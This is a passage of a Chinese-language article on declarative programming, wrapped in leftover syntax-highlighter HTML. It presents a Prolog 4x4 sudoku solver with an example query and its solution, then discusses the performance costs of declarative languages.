命令来查看执行计划并弄清楚在引擎下发生了什么。</p>\n<p>声明式语言的优点在于它允许你在更高层次的抽象下工作：你的任务就是描述所需输出的规范。例如，在 <a href=\"http://www.ybrikman.com/writing/2012/02/16/seven-languages-in-seven-weeks-prolog_16/\" target=\"_blank\" rel=\"nofollow\">Prolog 语言实现的一个简单数独解算器</a>中只列出了一个数独谜题的答案的每行、列和对角线应该是怎样的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e64866495628\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudoku(Puzzle, Solution) :-\r\n  Solution = Puzzle,\r\n  \r\n  Puzzle = [S11, S12, S13, S14,\r\n            S21, S22, S23, S24,\r\n            S31, S32, S33, S34,\r\n            S41, S42, S43, S44],\r\n  \r\n  fd_domain(Solution, 1, 4),\r\n  \r\n  Row1 = [S11, S12, S13, S14],\r\n  Row2 = [S21, S22, S23, S24],\r\n  Row3 = [S31, S32, S33, S34],\r\n  Row4 = [S41, S42, S43, S44],      \r\n  \r\n  Col1 = [S11, S21, S31, S41],\r\n  Col2 = [S12, S22, S32, S42],\r\n  Col3 = [S13, S23, S33, S43],\r\n  Col4 = [S14, S24, S34, S44],      \r\n  \r\n  Square1 = [S11, S12, S21, S22],\r\n  Square2 = [S13, S14, S23, S24],\r\n  Square3 = [S31, S32, S41, S42],\r\n  Square4 = [S33, S34, S43, S44],      \r\n  \r\n  valid([Row1, Row2, Row3, Row4,\r\n         Col1, Col2, Col3, Col4,\r\n         Square1, Square2, Square3, Square4]).\r\n \r\nvalid([]).\r\nvalid([Head | Tail]) :- fd_all_different(Head), valid(Tail).</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e64866495628-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e64866495628-31\">31</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-1\"><span class=\"crayon-e\">sudoku</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Puzzle</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Solution</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Solution</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Puzzle</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-3\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Puzzle</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S11</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S12</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S13</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S14</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">S21</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S22</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S24</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">S31</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S33</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S34</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">S41</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S42</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S43</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S44</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-8\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-9\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">fd_domain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Solution</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-10\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Row1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S11</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S12</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S13</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S14</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-12\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Row2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S21</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S22</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S24</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Row3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S31</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S33</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S34</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-14\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Row4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S41</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S42</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S43</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S44</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">      </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-15\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-16\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Col1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S11</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S21</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S31</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S41</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-17\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Col2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S12</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S22</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S42</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-18\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Col3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S13</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S33</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S43</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-19\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Col4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S14</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S24</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S34</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S44</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">      </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-20\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-21\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Square1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S11</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S12</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S21</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S22</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-22\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Square2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S13</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S14</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S24</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-23\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Square3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S31</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S41</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S42</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-24\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">Square4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">S33</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S34</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S43</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S44</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">      </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-25\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-26\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">valid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Row1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Row2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Row3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Row4</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-27\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">Col1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Col2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Col3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Col4</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-28\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">Square1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Square2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Square3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Square4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-29\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e64866495628-30\"><span class=\"crayon-e\">valid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e64866495628-31\"><span class=\"crayon-e\">valid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Head</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Tail</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fd_all_different</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Head</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Tail</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0074 seconds] -->\r\n<p>下面是如何运行上面的数独解算器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e6c399978969\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n| ?- sudoku([_, _, 2, 3,\r\n             _, _, _, _,\r\n             _, _, _, _,\r\n             3, 4, _, _],\r\n             Solution).\r\n \r\n \r\nS = [4,1,2,3,2,3,4,1,1,2,3,4,3,4,1,2]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e6c399978969-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e6c399978969-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e6c399978969-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e6c399978969-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e6c399978969-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e6c399978969-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e6c399978969-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e6c399978969-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e6c399978969-1\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudoku</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e6c399978969-2\"><span class=\"crayon-h\">             </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e6c399978969-3\"><span class=\"crayon-h\">             </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e6c399978969-4\"><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e6c399978969-5\"><span class=\"crayon-h\">             </span><span class=\"crayon-v\">Solution</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e6c399978969-6\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e6c399978969-7\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e6c399978969-8\"><span class=\"crayon-v\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>不幸的是，声明式编程语言的缺点是性能开销大。上面提到的排序算法时间复杂度可能是 <code>O(n!)</code>；数独解算器使用暴力搜索；而且大多数开发人员不得不提供数据库提示和额外的索引，以避免执行 SQL 查询时开销大且效率低的计划。</p>\n<p> 